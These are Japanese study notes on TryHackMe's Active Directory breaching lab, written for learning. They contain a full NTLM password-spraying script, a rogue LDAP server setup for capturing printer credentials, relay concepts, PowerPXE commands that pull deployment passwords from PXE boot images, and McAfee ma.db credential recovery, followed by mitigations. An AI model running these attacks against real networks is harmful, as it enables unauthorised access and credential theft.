

 コースURL : https://tryhackme.com/room/breachingad
 
# NTLM
- New Technology LAN Manager ( NTLM ) 
	- windows認証、NTLM認証という
- NTLMは、NetNTLM と呼ばれるチャレンジレスポンスベースの認証方式で認証している
	- NetNTLM を使用するサービスはインターネットに公開される可能性もある
代表的な例
- Outlook Web App (OWA) ログイン ポータルを公開する、内部でホストされている Exchange (メール) サーバー
- インターネットに公開されているサーバーのリモート デスクトップ プロトコル ( RDP ) サービス
- ADと統合された公開されたVPNエンドポイント
- インターネットに接続し、NetNTLM を利用する Web アプリケーション

アプリケーションがクライアントとADの間の中間役として機能し、全ての認証情報はチャレンジでDCに転送され、正常に完了するとアプリケーションがユーザーを認証する
→ "アプリケーションがユーザーに代わって認証を行うことを意味する"
ADの認証情報はDCにのみ保存されるべきで
→ **アプリケーション自体でユーザーを直接認証するのではなく、アプリケーションがAD認証情報を保存することを防ぐ**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c9113ad0ff443dd0973736552e85aa69.png)

##  BruteForce
- NTLM認証で公開されたサービスは、他の手段で発見された資格情報をテストするのに最適な場所
- ほとんどのAD環境ではアカウントロックアウトが設定されているため、完全なブルートフォース攻撃を実行することはできない
- 代わりに、パスワードスプレー攻撃を実行する必要がある
	- 一つのパスワードを設定し、全てのユーザーアカウントを試す
	- 設定するパスワードとしては、初期設定されているパスワードなど

NTLM認証を自動化するためのpythonファイル
- hydraでもできる
```python └─$ cat ntlm_passwordspray.py                                                                     
#!/usr/bin/python3

import requests
from requests_ntlm import HttpNtlmAuth
import sys, getopt

class NTLMSprayer:
    def __init__(self, fqdn):
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.verbose = True
        self.fqdn = fqdn

    def load_users(self, userfile):
        self.users = []
        lines = open(userfile, 'r').readlines()
        for line in lines:
            self.users.append(line.replace("\r", "").replace("\n", ""))

    def password_spray(self, password, url):
        print ("[*] Starting passwords spray attack using the following password: " + password)
        count = 0
        for user in self.users:
            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
                print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
                count += 1
                continue
            if (self.verbose):
                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                    print ("[-] Failed login with Username: " + user)
        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")

def main(argv):
    userfile = ''
    fqdn = ''
    password = ''
    attackurl = ''

    try:
        opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
    except getopt.GetoptError:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)

    for opt, arg in opts:
        if opt == '-h':
            print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
            sys.exit()
        elif opt in ("-u", "--userfile"):
            userfile = str(arg)
        elif opt in ("-f", "--fqdn"):
            fqdn = str(arg)
        elif opt in ("-p", "--password"):
            password = str(arg)
        elif opt in ("-a", "--attackurl"):
            attackurl = str(arg)

    if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
        #Start attack
        sprayer = NTLMSprayer(fqdn)
        sprayer.load_users(userfile)
        sprayer.password_spray(password, attackurl)
        sys.exit()
    else:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)



if __name__ == "__main__":
    main(sys.argv[1:])

```

使うための引数
```sh
python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>
<userfile> - ユーザー名を含むテキストファイル - "usernames.txt"
<fqdn> - 攻撃対象の組織に関連付けられた完全修飾ドメイン名 - "za.tryhackme.com"
<password> - スプレー攻撃に使用するパスワード - "Changeme123"
<attackurl> - Windows 認証をサポートするアプリケーションの URL - " http ://ntlmauth.za.tryhackme.com"
```

# LDAP
 - Lightweight Directory Access Protocol (LDAP)
 - LDAP認証はNTLM認証に似ていますが、LDAP認証では、アプリケーションがユーザーの資格情報を直接検証する
 → アプリケーションは、まずLDAPにクエリを実行し、次にADユーザーの資格情報を検証するために使用できるAD資格情報のペアを保持している
 - LDAP認証は、 ADと統合するサードパーティ製（Microsoft以外）アプリケーションでよく使用される認証メカニズム

|          | NTLM                 | LDAP                  |
| -------- | -------------------- | --------------------- |
| パスワードの扱い | アプリはハッシュ化されたチャレンジを転送 | アプリが**平文で**パスワードを受け取る |
| 認証の主体    | ADドメインコントローラーが判断     | アプリがLDAPプロトコルで問い合わせ   |
| プロトコル    | Windows独自            | オープンスタンダード            |

 具体的にLDAP認証が行われるアプリケーション例
 - Gitlab
- Jenkins
- Custom-developed web applications
- Printers
- VPNs
![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d2f78ae2b44ef76453a80144dac86b4e.png)
これらの認証情報は設定ファイルにプレーンテキストで保存されることが多い
### LDAPパスバック攻撃
- 会議室に不正なデバイスを接続するなど、内部ネットワークへの初期アクセスを取得した後に、プリンタなどのネットワークデバイスに対して行われる一般的な攻撃
- 攻撃対象
	- ネットワークプリンタ、複合機
	- 	LDAP連携機能を持つNAS、無線LANコントローラ など
- 攻撃メカニズム
	- ネットワークプリンタとかはLDAP認証してから、印刷する
	- その時に、ネットワークプリントからLDAPへ認証するためのサービスアカウントがある
	- ネットワークプリンタからLDAPへのサーバーのアクセスの時に、ネットワークプリンタを示すサービスアカウントをLDAPサーバーに送る
	- その時のLDAPサーバーのアドレスを攻撃者に向けることで、サービスアカウントを取得することができる
- 攻撃手法
	1.	攻撃者が内部ネットワークに侵入
		- （例：会議室のLANポートにノートPCをつなぐなど）
	2.	偽のLDAPサーバーを攻撃者側で立てる
		- （例：自分のノートPC上で「偽LDAPサーバー」を待ち受け状態に）
		- 通常のNetcatではLDAPパスバック攻撃を行えないため、**OpenLDAP**を使用し、設定する必要がある
			- OpenLDAPのインストール
				- `sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`
				- `sudo dpkg-reconfigure -p low slapd`
			- 設定
				- `If you enable this option, no initial configuration or database will be created for you.  Omit OpenLDAP server configuration? `
					- Noを選択する
				- `DNS domain Name`・`Organization name`には、プリンタがアクセスするであろうドメイン名を入れる
					- プリンタの設定webページのドメインなど
				- `Do you want the database to be removed when slapd is purged? `
					- Yesを選択する
				- ` Move old database?`
					- No
			- 必要な設定ファイルの作成
				- `cat > olcSaslSecProps.ldif <<'EOF'`
						dn: cn=config
						changetype: modify
						replace: olcSaslSecProps
						olcSaslSecProps: noanonymous,minssf=0,passcred
						EOF`
					- olcSaslSecProps: SASLセキュリティプロパティを指定
					- noanonymous: 匿名ログインをサポートするメカニズムを無効
					- minssf: 許容可能な最小セキュリティ強度を指定。0 は保護なしのこと
			- 設定ファイルの適用
				- `sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`
			- SASLメカニズムの広告を無効化（重要）
				- Debian/Kali系では、SASLの設定ファイルを `/usr/lib/sasl2/slapd.conf` に配置することで、SASLのメカニズムを制御できる
				- `sudo mkdir -p /etc/sasl2`
				- `echo "mech_list: PLAIN LOGIN" | sudo tee /etc/sasl2/slapd.conf`
				- `sudo cp /etc/sasl2/slapd.conf /usr/lib/sasl2/slapd.conf`
				- `sudo systemctl restart slapd`
				- 広告が消えたか確認
					- `ldapsearch -H ldap://127.0.0.1 -x -LLL -s base -b "" supportedSASLMechanisms`
						- 何も出ない、または PLAIN/LOGIN のみになっていればOK
							- このLOGIN/PLAINになっていることが大事
			- tcpdumpで通信を見る
				- `sudo tcpdump -A -s 0 -i breachad tcp port 389`
				- プリンタが Simple Bind で認証を行うと、BindRequest にユーザー名とパスワードが平文で含まれる
例
```
2...\....6.`g..P....-..0....;...`....2.....za.tryhackme.com\svcLDAP..<PASSWORD>
```
3.	プリンタの設定画面にアクセス
	- （管理者パスワードが初期設定のまま、または設定画面にアクセスできるケースが多い）
4.	LDAPサーバーの接続先を、偽サーバー（攻撃者PCのIP）に書き換える
5.	プリンタがテスト接続を行う際に、設定済みのLDAPサービスアカウントの認証情報を送信
	- → 攻撃者の偽LDAPサーバーで、平文または簡易エンコードされた形でユーザー名／パスワードが受信される
6.	取得したサービスアカウントでADにログインし、横展開

攻撃の注意点
- 基本的に、プリンターは資格情報を送信する前に、LDAP認証方法の詳細についてネゴシエーションを試みて、プリンターとLDAPサーバーの両方がサポートする最も安全な認証方法が選択される
	- 認証方法が安全すぎる場合、資格情報は平文で送信されない
	- 認証方法によっては、資格情報がネットワーク経由で全く送信されないこともある
	- そのため、**通常のNetcatを使用して資格情報を収集することはできない**

# 認証リレー
## SMB
- Server Message Protocol
- 文書を印刷しようとした際にコンピューターに表示される「用紙切れ」の警告も、SMBプロトコルによるもの
- 古いバージョンでいくつか脆弱性が見つかっている
	- NTLMチャレンジの傍受
		- オフラインクラッキング技術を用いてNTLMチャレンジに関連付けられたパスワードを復元することが可能
		- しかし、NTLMハッシュを直接クラックするよりも大幅に時間がかかる
	- 中間者攻撃
		- 不正なデバイスを使用して中間者攻撃を仕掛け、 クライアントとサーバー間のSMB認証を中継することで、アクティブな認証済みセッションとターゲット サーバーへのアクセスが可能になる
## LLMNR、NBT-NS、およびWPAD
- Responder を使用して NetNTLM チャレンジを傍受し、解読を試みる
- 通常、ネットワーク上にはこのようなチャレンジが多数存在する
- 一部のセキュリティソリューションでは、ホストから情報を復元するために IP アドレス範囲全体をスキャンすることもある
- DNS レコードが古い場合、これらの認証チャレンジが意図したホストではなく、不正なデバイスに届くことがある

SMBリレーとか
- SMB署名は、無効にするか、有効にして強制しないようにする必要がある
- リレーを実行する際、リクエストに若干の変更を加えて転送します。SMB署名が有効になっている場合、メッセージ署名を偽造することができないため、サーバーはメッセージを拒否する
- 関連付けられたアカウントは、要求されたリソースにアクセスするために、サーバー上で適切な権限を持っている必要がある
- 理想的には、サーバーの管理者権限を持つアカウントのチャレンジとレスポンスを中継することで、ホストへの足掛かりを得ることができると考えている

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6baba3537d36d0fa78c6f61cf1386f6f.png)


# Microsoft Development Tool Kit
- Microsoft Deployment Toolkit (MDT) 
- Microsoft オペレーティングシステム ( OS )の展開を自動化する Microsoft のサービス
- 大規模組織では、MDT などのサービスを利用することで、ベースイメージを一元的に管理および更新できるため、新しいイメージをより効率的に展開できる
- 通常、MDTはMicrosoftのSystem Center Configuration Manager（SCCM）と統合されている
	- SCCM
		- Microsoftのすべてのアプリケーション、サービス、およびオペレーティングシステムのすべてのアップデートを管理できる
		- 基本的に、ITチームはMDTを使用することでブートイメージを事前構成および管理できる
		- 新しいマシンを構成する必要がある場合は、ネットワークケーブルを接続するだけで、すべてが自動的に実行される
			- Office365や組織が選択したウイルス対策ソフトウェアなどのデフォルトソフトウェアを既にインストールしておくなど、ブートイメージに様々な変更を加えることができる
			- インストールの初回実行時に新しいビルドが確実に更新されるようにすることもできる
		- SCCMはMDTの拡張機能であり、いわば兄貴分と言える
	- ITチームは、SCCMを使用することで、組織全体にインストールされているすべてのソフトウェアの利用可能なアップデートを確認できる
MDTやSCCMのようにインフラストラクチャの集中管理機能を提供するものも、攻撃者の標的となり、組織の重要な機能の大部分を乗っ取ろうとする可能性がある
MDTは様々な方法で設定できますが、ここではPreboot Execution Environment（PXE）ブートと呼ばれる設定にのみ焦点を当てる

## PXEブート
- PXEブート
	- ネットワークに接続された新しいデバイスが**ネットワーク経由でOS（またはインストーラ）を起動する仕組み**
- MDTは、PXEブートイメージの作成、管理、およびホスティングに使用できる
- PXEブートは通常、 DHCPと統合されている
- DHCPがIPリースを割り当てると、ホストはPXEブートイメージを要求し、ネットワークOSインストールプロセスを開始できる

 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/8117a18103e98ee2ccda91fc87c63606.png)
TFTP接続を使用してPXEブートイメージをダウンロードする

PXEブートイメージを悪用する目的
- ローカル管理者アカウントなどの権限昇格ベクターを注入し、PXE bootが完了した後にOSへの管理者アクセスを取得する
- パスワードスクレイピング攻撃を実行し、インストール中に使用されたAD認証情報を回収する
	- インストール中にMDTサービスに関連付けられたデプロイメントサービスアカウントの回収を試みる
	- アプリケーションやサービスの無人インストールに使用される他のADアカウントを取得できる可能性もある

### PXE Bootイメージの取得
- DHCPサーバーから取得する情報
	- MDTサーバーのIP
	- BCDファイルの名前
		- Boot Configuration Data（ブート構成データ）
			- Windows のブートマネージャー（bootmgr）が参照する**OS起動の設定情報を格納したデータベースファイル** のこと
			- さまざまなタイプのアーキテクチャのPXE Bootに関連する情報が保存されている
			- 

攻撃手順  
1. PXEブート構成を悪用して、MDT（Microsoft Deployment Toolkit）サーバーから PXE ブートイメージと認証情報を取得する
	- 大規模組織では OS のインストールや更新を効率的に行うため、**MDT と SCCM** を利用して PXE ブート経由で OS をネットワークインストールする仕組みを導入している。
	- 攻撃者は PXE ブート環境に含まれる **BCDファイル（Boot Configuration Data）** や **WIMイメージ** をダウンロードし、設定情報・認証情報を解析することで、Active Directory のサービスアカウントなどの資格情報を窃取できる。

2. PXE Boot Image Retrieval（PXEブート情報の取得）
	- DHCPを経由した初期通信はスキップし、手動で BCD ファイルと PXE ブートイメージを取得する。
	- まずは **MDTサーバーのIPアドレス** を取得（例：`nslookup thmmdt.za.tryhackme.com`）。
	- 次に、PXEブート用の BCD ファイル名を確認する。
		- 例：http://pxeboot.za.tryhackme.com にアクセスして、`x64{...}.bcd` のようなファイル名を特定する。

3. BCDファイルのダウンロード
- SSHで THMJMP1 に接続
	- `ssh thm@THMJMP1.za.tryhackme.com`  
	  パスワード：`Password1@`

- PowerPXE のフォルダを作成して準備
	```cmd
	C:\Users\THM>cd Documents
	C:\Users\THM\Documents> mkdir <username>
	C:\Users\THM\Documents> copy C:\powerpxe <username>\
	C:\Users\THM\Documents\> cd <username>
	```

- TFTPを使用して BCD ファイルをダウンロード  
  （`<THMMDT IP>` と BCDファイル名は環境に合わせる）
	```cmd
	C:\Users\THM\Documents\<username>> tftp -i <THMMDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd
	Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s
	```

4. BCDファイルから PXEブートイメージのパスを解析
	- PowerPXE のモジュールをインポートし、`Get-WimFile` で BCD ファイルを解析する
```cmd
PS C:\Users\THM\Documents\<username>> powershell -executionpolicy bypass
PS C:\Users\THM\Documents\<username>> Import-Module .\PowerPXE.ps1
PS C:\Users\THM\Documents\<username>> $BCDFile = "conf.bcd"
PS C:\Users\THM\Documents\<username>> Get-WimFile -bcdFile $BCDFile
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : <PXE Boot Image Location>
<PXE Boot Image Location>
```

5. PXEブートイメージ（WIMファイル）のダウンロード
	- BCD解析で判明した PXE ブートイメージのパスを指定し、TFTPでダウンロード
```cmd
PS C:\Users\THM\Documents\<username>> tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim
Transfer successful: 341899611 bytes in 218 second(s), 1568346 bytes/s
```
- WIMファイル（Windows Imaging Format）は完全なOSイメージなので、転送には時間がかかる。

6. PXEブートイメージから資格情報を抽出
	- PowerPXE の `Get-FindCredentials` を使用して、WIMイメージ内の bootstrap.ini から認証情報を抽出
```cmd
PS C:\Users\THM\Documents\<username>> Get-FindCredentials -WimFile pxeboot.wim
>> Open pxeboot.wim
>>>> Finding Bootstrap.ini
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
>>>> >>>> UserID = <account>
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = <password>
```

- ここで回収されるのは、PXEブート時に MDT サーバーと通信するための **ドメイン資格情報**（サービスアカウントなど）。
- この資格情報を使うことで、AD環境への横展開や特権昇格を狙える。


# 設定ファイル
- 組織のネットワーク上のホストにアクセスできたとき、構成ファイルはAD認証情報の復旧を試みるための優れた手段となる
- 列挙に役立つ構成ファイル
	- Webアプリケーション構成ファイル  
	- サービス構成ファイル
	- レジストリキー
	- ADに展開されているアプリケーションの設定ファイル
- このプロセスを自動化するには、 [Seatbelt](https://github.com/GhostPack/Seatbelt)などのいくつかの列挙スクリプトを使用できる

集中管理されたアプリケーションからの認証情報の復旧
- 通常、これらのアプリケーションは、インストールフェーズと実行フェーズの両方でドメインへの認証手段を必要とする
	- 例 : McAfee Enterprise Endpoint Securityが挙げられる

 McAfee Enterprise Endpoint Security
- 組織がセキュリティ対策のためのエンドポイント検出および対応ツールとして利用するもの
- McAfeeは、インストール時にオーケストレーターに接続するために使用する認証情報を**ma.dbというファイルに埋め込む**
- このデータベースファイルは、ホストへのローカルアクセスで取得・読み取りが可能で、関連付けられたADサービスアカウントを復元できる

ma.dbの保存場所
- `C:\ProgramData\McAfee\Agent\DB\ma.db`
- sqlitebrowser を使って開いて、[データの参照] オプションを選択し、AGENT_REPOSITORIES テーブルを見る
- 特に注目すべきは、DOMAIN、AUTH_USER、AUTH_PASSWDフィールドのエントリに着目した2番目のエントリ
- AUTH_PASSWDフィールドは暗号化されている
	- McAfeeはこのフィールドを既知のキーで暗号化しているため、復号することができる

# 攻撃防止策

- ユーザー教育とトレーニング  
	- サイバーセキュリティにおける最も弱いリンクは常に「ユーザー」であることが多い。  
	- 資格情報などの機密情報を安易に開示しないことや、不審なメールを信用しないようユーザーを教育・訓練することで、攻撃面を大幅に減らすことができる。

- ADサービスやアプリケーションのオンライン公開範囲を制限  
	- NTLMやLDAP認証をサポートするアプリケーションは、インターネットから直接アクセス可能な状態にするべきではない。  
	- 代わりに、VPN経由でアクセス可能なイントラネットに配置し、VPNには多要素認証（MFA）を導入してセキュリティを強化する。

- ネットワークアクセス制御（NAC）の導入  
	- NACを導入することで、攻撃者が不正な端末をネットワークに接続するのを防止できる。  
	- ただし、正規端末の許可リスト化（allowlisting）など、運用には一定の工数が必要となる。

- SMB署名（SMB Signing）の強制  
	- SMB署名を有効にすることで、SMBリレー攻撃（SMB Relay Attacks）を防止できる。

- 最小特権の原則（Principle of Least Privilege）の徹底  
	- 攻撃者は何らかの形でAD資格情報を取得できる可能性がある。  
	- 特にサービスアカウントなどの資格情報について、不要な権限を与えないことで、漏洩時のリスクを最小限に抑えられる。

- 次のステップ  
	- ADへの侵入が成功した後は、ドメイン構造の把握や潜在的な設定ミスの特定のために **ADの列挙（Enumeration）** を行う。  
	- 次の演習ではこの列挙手法について学ぶ。  
	- 演習後は DNS 設定のクリアを忘れずに実施すること。